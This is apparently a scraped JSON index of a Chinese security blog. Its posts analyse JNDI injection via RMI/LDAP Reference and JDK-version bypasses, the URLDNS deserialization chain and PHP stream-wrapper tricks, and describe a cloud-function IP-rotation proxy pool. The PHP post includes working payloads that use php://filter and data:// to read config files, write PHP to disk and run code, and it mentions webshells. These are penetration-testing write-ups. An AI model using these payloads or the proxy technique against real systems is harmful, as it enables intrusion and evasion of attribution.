最后成功通过RMI Reference实现JNDI注入，执行恶意代码 RMI Reference攻击利用分析 分别在上面两行打上断点，先看一下Reference类引用对象的实例化做了什么，再看重点 bind 方法 实例化Reference远程引用对象，这里没什么需要注意看的，就只是创建了一个Reference类的引用对象，分别给类名、类工厂名、类工厂位置进行了赋值 这里需要重点关注的入口是 bind 方法，跟进看一下 这里将 Reference 引用对象和类名 exp 作为 encodeObject 方法的参数并调用，跟进去看一下 这里将前面实例化的Reference类型对象进行实例化 ReferenceWrapper 类型对象 到了这里 bind 方法就结束了，已经将 ReferenceWrapper 类型的引用对象绑定到RMI注册表中指定名称 exp 上，恶意服务端的RMI指定名称上已经绑定了我们的恶意代码引用对象 在受害者服务端这边，让其查找我们的恶意RMI服务，跟进lookup方法往下看 这里使用RMI查找绑定指定名称 exp 的远程对象 这里调用了 decodeObject 方法，因为在恶意服务端那边将默认的Reference进行了 encodeObject 方法之后返回了 ReferenceWrapper 类型引用对象，所以这边需要调用 decodeObject 方法获取原来的 Reference 类型引用对象。 这里将 ReferenceWrapper 类型引用对象变量 r 强转为 RemoteReference 类型远程引用对象并调用 getReference 获取 Reference 类型引用对象，又变回在恶意服务端那边的 Reference 对象 这里调用了 NamingManager 类的 getObjectInstance 静态方法，跳到了 NamingManager 类中，继续跟进 这里获取的是一个为null值的ObjectFactoryBuilder对象 这里将传入参数 refInfo 的 Reference 类型引用对象赋值给了ref变量 这里从 Reference 类型引用对象中获取指定类的对象工厂，跟进看一下 这里进行了类加载操作，是从本地查找 exp 类 这里使用的加载器是 AppClassLoader，AppClassLoader 会加载当前应用程序所在的类路径下的类，包括应用程序的类和第三方库的类，那肯定是找不到这个 exp 类的 来到这里，获取了 Reference 类型引用对象的类工厂位置，就是前面的远程地址  这里使用 URLClassLoader 加载器实例化对象获得一个 FactoryClassLoader 加载器 最后使用 FactoryURLClassLoader 加载器远程加载了 exp 类，这个时候就请求了  地址了 通过 FactoryURLClassLoader 加载到了 exp 类后，实例化了 exp 类，在我们写的恶意代码 exp.java 中在无参构造方法写入了执行命令弹出计算器 在实例化对象时，会默认调用无参的构造方法，最终成功使用RMI Reference执行命令 LDAP Reference攻击上面，我们使用RMI Reference进行了远程加载恶意类，但是仅限于JDK8u121以下版本，在8u121及以后版本针对了对RMI远程加载的漏洞修复 在JDK8u121及以后版本，在RMI相关操作上增加了 trustURLCodebase 系统属性，该属性值默认为 false，要想修改必须设置系统属性，这样上面的例子就不能进行远程加载恶意代码了。 但是修复了RMI上的远程加载问题，LDAP还没有解决，在上面我们分析RMI Reference利用时发现，真正的远程加载其实是在 NamingManager 的 getObjectInstance 的方法中，在这之前不过只是对远程引用对象处理，不是只有RMI才可以绑定引用对象，LDAP一样可以，官方当时没有在JDK8u121版本对LDAP进行修复，这样就绕过了上面的修复方式 受害者服务端使用 ldap 协议 这里创建LDAP服务使用Apache Directory Studio软件进行创建，该软件需要在JDK11版本使用，JDK8和JDK17版本可能会出现问题。不想使用这种方式也可以使用 JNDIExploit、marshalsec 等工具生成一个LDAP服务 点击创建一个连接 选择 javaContainer、javaNamingReference、javaObject、top 填写好对应类名、代码库地址、类工厂名即可 在受害者服务端运行代码即可执行恶意代码 LDAP Reference攻击利用分析 在受害者服务端的 lookup 上打断点调试即可 这里调用了该类的父类的 lookup 方法 这里上面RMI利用类似，获取URL上下文并获取解析后的对象强转成Context类型的对象 在这里获取到了LDAP服务上的属性，也就是我们在LDAP加的那几个属性 这里判断LDAP服务属性中有没有 javaclassname 属性 这里都是获取属性的操作，没有设置这些属性，下面的判断都不符合 将LDAP属性和代码库位置作为参数调用了 decodeReference 方法 这里获取到了类名和类工厂名，随后将类名和工厂名作为参数实例化 Reference 类型引用对象 由于后面没有符合条件，就返回了这个引用对象 此时，变量 obj 就是一个 Reference 类型引用对象 再往下走，发现调用了 DirectoryManager.getObjectInstance 静态方法，继续跟进看一下 这里感觉似曾相识，和上面RMI利用那一块很像 从引用对象中获取类工厂名，然后再从引用对象中获取工厂对象，再跟进 这里进行了类加载，跟进看一下 这里使用了AppClassLoader查找类进行加载，当然是没有的 再到这里获取了代码库的地址，尝试远程加载代码库中的类工厂 这里就获得了一个 FactoryURLClassLoader 加载器，再使用这个加载器远程加载类 这里对加载到的类进行实例化，即实例化了恶意类 最后，成功使用LDAP Reference绕过执行恶意代码 高版本JDK绕过在JDK6u211、7u201、8u191、11.0.1版本及以后，默认将 com.sun.jndi.ldap.object.trustURLCodebase 选项设置为false 但不管怎么禁止，我们还是可以通过本地的 Factory 类执行命令，在上面我们知道，真正在执行命令的地方其实是在调用 getObjectInstance() 方法的时候，使用RMI时调用的是 NamingManager.getObjectInstance() 方法，使用LDAP时使用的是 DirectoryManager.getObjectInstance() 方法 这两个 getObjectInstance() 方法有个共同点，都会从引用对象中获取一个对象工厂，而这个对象工厂只需要可以实例化类并调用方法，且类名、属性、属性值等参数都来自于 Reference 类型引用对象，是我们可控即可。而我们要利用的 Factory 类必须实现了 javax.naming.spi.ObjectFactory 接口，并且实现该接口的 getObjectInstance() 方法 根据上面的条件，找到了 org.apache.naming.factory.BeanFactory 类，这个类符合上面的条件，在Tomcat依赖包中。该类 getObjectInstance() 方法通过反射实例化Reference引用对象指向的类，调用setter方法。 依赖项： 恶意服务端代码如下： 受害者服务端如下： 高版本JDK绕过利用分析 这里其实也没什么好讲的了，最终要在RMI服务上查找指定名称 这里获取了一个 ReferenceWrapper 类型引用对象，和前面讲过的一样，需要调用decodeObject 方法来返回一个 Reference 类型引用对象，继续跟进 这里的操作和前面讲的都差不多，不再过多解释 来到这里，调用 NamingManager.getObjectInstance() 静态方法 这里就真正的调用了 org.apache.naming.factory.BeanFactory 类的 getObjectInstance()静态方法，继续跟进看一下 这里的变量 obj 就是一个 ResourceRef 资源引用对象 通过 AppClassLoader 加载器加载了 javax.el.ELProcessor 类 这里通过反射获取上面的加载到的 javax.el.ELProcessor 的构造器进行实例化，获取了一个 javax.el.ELProcessor 对象 这里的操作其实就是获取了引用对象的 forceString 引用类型的值，也就是 x=eval，这里用逗号分隔成数组，应该是可以使用逗号传递多个引用值的，这里只有一个，然后就是获取了 = 这个字符出现的位置 再往下，就是获取了 = 字符前面和后面的字符串，分别是eval和x，forced是个HashMap类型的，把x作为键，通过反射获取 javax.el.ELProcessor 的eval方法作为值添加进去 这里获取了引用对象中的所有引用地址 再继续往下就是一直循环判断引用类型是否匹配，匹配的话就跳出循环进行下一次循环，否则继续往下执行。直到遍历到x引用类型，不匹配，则往下执行 获取了x引用类型的引用值后，又获取了在上面forced的x键值，也就是eval方法 在211行真正的进行了方法调用，变量 bean 就是 javax.el.ELProcessor 实例化的对象，valueArray则是x引用地址的引用值，也就是需要执行的恶意命令，通过反射进行了方法调用 最后，调用后成功执行了我们恶意服务端上的代码 高版本其他绕过方式除了上面的 ELProcessor 的方式绕过，还有其他的方法，这里就不再做调试分析了，原理都大差不差 GroovyClassLoader依赖： 恶意服务端： 受害者服务端： 参考链接 浅析JNDI注入 [ Mi1k7ea ]  高版本JDK下的JNDI注入浅析 - 先知社区  探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖"},{"title":"Java RMI远程方法调用","date":"2022-07-20T03:29:51.236Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/403f70182d22.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["RMI","/tags/RMI/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"简介 RMI全称是 Remote Method Invocation，远程⽅法调⽤。让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，RMI是Java独有的⼀种机制。 实现RMI Server的三部分： 创建一个继承了 java.rmi.Remote 的接口，在该接口中定义需要远程调用的函数。 创建一个实现了此接口的类，并继承 UnicastRemoteObject 类。 此实现接口类创建RMI注册表Registry的方法，将实现接口类进行实例化并绑定到RMI注册表中，并调用该方法启动RMI服务。 RMI具体实现代码 运行RMIServer类后，再运行RMIClient类，成功通过RMI调用远程对象方法。 这里借用一张图来看这次RMI远程调用方法的整个过程： RMI Registry像是一个路由网关，在RMIServer类上创建RMI注册表Registry绑定对象的关系，RMIClient通过Naming查询RMI Registry注册表的绑定关系，连接RMIServer，远程方法在RMIServer上调用。"},{"title":"URLDNS利用链","date":"2022-06-22T08:35:17.669Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/c180fda4a6eb.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["URLDNS","/tags/URLDNS/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"利用链 URLDNS利用链如下： HashMap.readObject() -&gt; HashMap.putVal() -&gt; HashMap.hash() -&gt; URL.hashCode() -&gt; URLStreamHandler.hashCode() -&gt; URL.getHostAddress() -&gt; URL.getByName() 利用链分析Java中Map集合有Key和Value，可以接受任何数据类型的数据。入口类的参数是可控的并且可以是任意类或对象。 其中HashMap是Map接口的实现类，它继承了Serializable，HashMap是可被序列化的。 在HashMap重写了 readyObject 方法 在 readObject 方法中调用了 putVal 方法，在 putVal 方法中调用了 hash 方法 继续跟进，调用了 hash 方法中的 key 参数对象的 hashCode 方法 这里，参数是哪个对象就会调用哪个对象的 hashCode 方法 Java中的 URL 类，重写了 hashCode 方法并且可以DNS请求 找到 URL 类，重写了 hashCode 方法 这里的逻辑是，当 hashCode 变量为 -1 时才会执行到 handler.hashCode() 方法 handler 变量是 URLStreamHandler 类 找到 URLStreamHandler 类中的 hashCode 方法 调用了 getHostAddress 方法 再继续跟进，getByName 方法可以发起DNS请求 到这里，我们就理清楚URLDNS链的整个过程了。 利用链利用在上面，我们说到 hashCode 变量为 -1 是才会执行 handler.hashCode() 方法，该变量默认为 -1，那么在利用时就会出现一个问题，在执行 HashMap.put 方法时就会进行一次请求，无法确认是在反序列化时进行的DNS请求还是在序列化HashMap类时，HashMap的put方法导致的DNS请求。 先对 hashMap 对象进行序列化生成 obj.ser 文件 当程序接受一个序列化对象文件并反序列化操作时就读取了序列化的 HashMap 对象，此时 HashMap 的 hashCode 值为 -1 ，即可进行DNS查询。"},{"title":"PHP常见的利用协议","date":"2022-01-12T03:46:40.167Z","url":"/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/de9f49bb405f.html","tags":[["PHP","/tags/PHP/"],["协议","/tags/%E5%8D%8F%E8%AE%AE/"]],"categories":[["技术分享","/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":" PHP伪协议就是PHP支持的一些协议，并且封装起来使用的协议，就叫伪协议 file:&#x2F;&#x2F; file协议用来访问本地系统文件的，在渗透测试中常用来读取系统文件 条件： allow_url_include 为 On 这里的协议比较容易理解，和访问本地系统文件一样读取就可以了 file://C:\\\\windows\\\\win.ini php:&#x2F;&#x2F;php:&#x2F;&#x2F;filter 这种协议一般出现在PHP的文件读取写入函数中 条件： allow_url_include 为 On 简单理解一下这个协议，它能够处理数据流，比如读取文件时通过base64进行加密输出 php://filter/read=convert.base64-encode/resource=../../config/database.php 再来看个例子，也是实战中比较多的 在写入文件之前，加入一个PHP的退出函数 输入Payload为 txt=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=convert.base64-decode/resource=a.php 时报错了 这是由于base64编码，在解码时是4个字节为一组，如果不足在编码前补充对应字符 txt=bbPD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=a.php 此时成功写入 还有一个方法，使用这个协议的 string.strip_tags 方法，XML遇到PHP标签时，会解析成XML标签，使用这个方法可以删除这个标签，然后再处理输入流 txt=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=a.php 详细过程看： php:&#x2F;&#x2F;input 输入流input，访问请求的原始输入流，当 enctype=&quot;multipart/form-data&quot; 的时候，php:&#x2F;&#x2F;input 是无效的，只要 enctype 值不是 multipart/form-data ，这个协议就管用 条件： allow_url_include 为 On enctype 值不为 multipart/form-data 看一个例子 这里就可以使用 php://input 协议 这里有一个很疑惑的点，输入流原始数据必须符合参数化形式，不然不会被执行，网上很多文章都是不需要的，PHP5.4版本貌似没用 data:&#x2F;&#x2F; data:// 数据流封装器，漏洞出现在PHP文件包含处 条件： allow_url_include 为 On allow_url_fopen 为 On ?p=data://text/plain;base64,YWFhYWFhYQ== 该协议常用来封装数据，可以使用base64进行加密传输，输出时可自动解密为明文 aaaaaaa ?p=data://text/plain,&lt;?php phpinfo();?&gt; ?p=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B 在base64编码后，需要对base64编码特殊字符做URL编码，否则浏览器识别不了 zip:&#x2F;&#x2F; zip:// 伪协议的格式为 zip://[压缩文件路径]#[压缩文件内的子文件名] 将PHP文件放在一个文件夹中，将这个文件夹压缩成ZIP格式，再将压缩文件后缀改为 .jpg 这里需要注意的是 # 需要进行URL编码 常用于在文件包含中使用 ?p=zip://a.jpg%231.php 将1.php写成一句话木马，通过Webshell管理工具进行连接 phar:&#x2F;&#x2F; phar 是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 在这里，我测试了很多网上的方法，只测试成功了一个 首先，这里要创建一个 phar ，在本地写好并且运行创建 在本地创建的时候注意了，将 php.ini 中的 phar.readonly 设置为Off，否则无法生成phar文件 使用命令 php 1.php 执行后，会在当前目录生成一个 a.zip 文件 a.zip 为创建的phar文件名，这里使用的是 zip 格式，读取一句话木马文件 a.php 写入到phar压缩包中的 a.jpg 中 若文件包含可控，直接传入参数 phar://a.zip/a.jpg 即可执行我们想要执行的代码 还有一些其他操作："},{"title":"云函数的代理IP利用面","date":"2021-08-02T06:27:47.000Z","url":"/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/618dcd2c2088.html","tags":[["云函数","/tags/%E4%BA%91%E5%87%BD%E6%95%B0/"],["代理IP","/tags/%E4%BB%A3%E7%90%86IP/"]],"categories":[["技术分享","/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"0x01 前言什么是云函数？云函数（Serverless Cloud Function，SCF）是云计算厂商为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码， 是实时文件处理和数据处理等场景下理想的计算平台。只需使用 SCF 平台支持的语言编写核心代码并设置代码运行的条件，即可在某云基础设施上弹性、安全地运行代码。 为什么通过云函数代理IP？这是因为云函数会自动的在同一个地域内的多个可用区部署，在请求目标时，会自动调用不同的可用区的IP地址。这样一来，每次请求IP会发生改变，也就达到了我们想要建立一个代理池的目的。 0x02 构建云函数代理池本地环境系统：macOS Big Sur Python版本：3.7.7 代理客户端：mitmproxy 云函数厂商：腾讯云 配置云函数新建云函数 选择自定义部署，运行环境为 Python ，通过在线编辑，将 SCFProxy 工具中的 server.py 文件代码替换进去，然后点击完成会自动部署 创建触发器 按照图示，依次选择创建API网关触发器 将访问路径记下 修改代理客户端配置 打开 SCFProxy 工具目录下的 HTTP，编辑 client.py 文件，将API网关触发器中的访问路径地址加入到 scf_servers 中 0x03 本地代理 本文章使用的代理客户端为 mitmproxy ，由于使用的是Python脚本处理代理请求，还需要使用pip安装 mitmproxy 模块（建议在官网下载对应的whl文件进行安装），这里需要注意安装对应版本的 mitmproxy 否则可能会出现一些问题。本文使用代理客户端的版本是 7.0.0，Python模块版本是：7.0.0。 为了方便，我将 client.py 文件复制到了 mitmproxy 工具目录中 然后执行 ./mitmdump -s client.py -p 8081 --no-http2 即可在本地端口8081上开启代理 通过浏览器代理工具进行代理，代理协议为 HTTP 代理服务器为 127.0.0.1 代理端口为 8081 浏览器代理后，可以看到IP地址也变了，每次请求IP地址都会变化 可以看到访问网页的请求都会经过云函数请求返回到本地 0x04 参考资料链接【干货】利用云函数实现免费IP代理 利用云函数（SCF）打造海量代理池 工具mitmproxy SCFProxy"},{"title":"About Me","date":"2023-08-25T16:39:11.780Z","url":"/about/index.html","categories":[[" ",""]],"content":"喜欢研究Java安全、安全开发、红队方向的内容 如若文章中内容存在错误，希望各位佬们指正 Wechat：Nzc2OTZjNjU3OTczNjU2Mw&#x3D;&#x3D;"},{"title":"Links","date":"2023-08-09T01:50:54.648Z","url":"/links/index.html","categories":[[" ",""]]},{"title":"Archives","date":"2023-08-09T01:55:34.217Z","url":"/archives/index.html","categories":[[" ",""]]},{"title":"Search","date":"2023-08-09T01:51:52.324Z","url":"/search/index.html","categories":[[" ",""]]},{"title":"Tags","date":"2023-08-09T01:51:17.620Z","url":"/tags/index.html","categories":[[" ",""]]}]